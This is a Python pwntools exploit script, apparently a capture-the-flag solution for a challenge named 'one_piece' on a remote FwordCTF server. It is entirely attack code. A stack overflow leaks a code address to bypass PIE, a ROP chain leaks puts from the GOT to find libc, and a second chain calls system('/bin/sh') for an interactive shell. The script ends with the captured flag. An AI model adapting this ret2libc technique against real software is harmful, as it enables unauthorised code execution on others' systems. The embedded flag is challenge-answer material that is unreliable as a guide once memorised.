from pwn import *

local = 0 

if local == 1:
    p = process("./one_piece")
    puts_offset = 0x80a30
    system_offset = 0x4f4e0
    binsh_offset = 0x1b40fa
else :
    p = remote("onepiece.fword.wtf",1238)
    puts_offset = 0x087490
    system_offset = 0x0554e0
    binsh_offset = 0x1b6613
    

puts_got = 0x201fa0
puts_plt = 0x720
pr = 0x00ba3 #pop rdi ; ret
ppr = 0x0ba1 #pop rsi ; pop r15 ; ret
main = 0xb1a
    
p.sendlineafter(">>","read")

payload = "" +\
        "a"*39 +\
        "z"

p.sendlineafter(">>",payload)


p.sendlineafter(">>","gomugomunomi")
p.recvuntil("right ? :")
codebase = int(p.recvline()[:-1],16) - 0xa3a
log.info(hex(codebase))

payload = "a"*0x38 +\
        p64(codebase+pr) +\
        p64(codebase+puts_got) +\
        p64(codebase+puts_plt) +\
        p64(codebase+main)
        
p.sendlineafter("something ? :",payload) 
p.recvline()
libc = u64(p.recvline()[:-1]+"\x00\x00") - puts_offset
binsh = libc+binsh_offset
system = libc+system_offset


log.info(hex(libc))

p.sendlineafter(">>","read")

payload = "" +\
        "a"*39 +\
        "z"

p.sendlineafter(">>",payload)


p.sendlineafter(">>","gomugomunomi")

payload = "a"*0x38 +\
        p64(codebase+ppr) +\
        p64(0) + \
        p64(0) + \
        p64(codebase+pr) +\
        p64(binsh) +\
        p64(system) 
pause()        
p.sendlineafter("something ? :",payload)

p.interactive()

#FwordCTF{0nE_pi3cE_1s_Re4l}